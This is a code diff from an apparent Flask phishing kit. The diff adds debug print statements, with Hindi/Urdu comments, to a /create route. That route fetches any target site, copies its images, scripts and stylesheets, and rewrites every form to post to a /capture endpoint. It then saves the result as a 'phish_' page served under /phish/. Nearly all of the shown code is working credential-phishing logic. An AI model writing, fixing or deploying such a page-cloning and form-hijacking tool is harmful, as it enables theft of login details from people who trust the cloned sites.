@@ -63,38 +63,41 @@ def dashboard():
 
 @app.route('/create', methods=['POST'])
 def create_phish():
+    print("🟢 /create route was HIT!") # <-- YE DEBUG PRINT HAI
     try:
         target_url = request.form.get('target_url', '')
+        print(f"🔍 Target URL received: {target_url}") # <-- YE BHI DEBUG PRINT HAI
+        
         if not target_url:
+            print("❌ ERROR: No URL provided")
             return jsonify({'success': False, 'error': 'No URL provided'}), 400
 
+        print("✅ Starting page cloning process...")
         response = requests.get(target_url, timeout=10)
         response.raise_for_status()
         
         soup = BeautifulSoup(response.text, 'html.parser')
         campaign_id = str(uuid.uuid4())
         
-        # Get the base domain for resolving relative URLs
         base_domain = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}"
         
-        # Download and replace images, scripts, and stylesheets
         download_and_replace_asset(soup, 'img', 'src', base_domain, campaign_id)
         download_and_replace_asset(soup, 'link', 'href', base_domain, campaign_id)
         download_and_replace_asset(soup, 'script', 'src', base_domain, campaign_id)
         
-        # Modify forms
         for form in soup.find_all('form'):
             form['action'] = f'/capture?campaign_id={campaign_id}'
             form['method'] = 'POST'
         
-        # Save the modified HTML
         file_path = f'templates/phish_{campaign_id}.html'
         with open(file_path, 'w', encoding='utf-8') as f:
             f.write(str(soup))
         
+        print(f"✅ SUCCESS! Phishing page created for campaign: {campaign_id}")
         return jsonify({'success': True, 'url': f'/phish/{campaign_id}', 'campaign_id': campaign_id})
 
     except Exception as e:
+        print(f"🔥 CRITICAL ERROR: {str(e)}") # <-- YE BHI DEBUG PRINT HAI
         return jsonify({'success': False, 'error': f'Internal error: {str(e)}'}), 500
 
 @app.route('/phish/<campaign_id>')
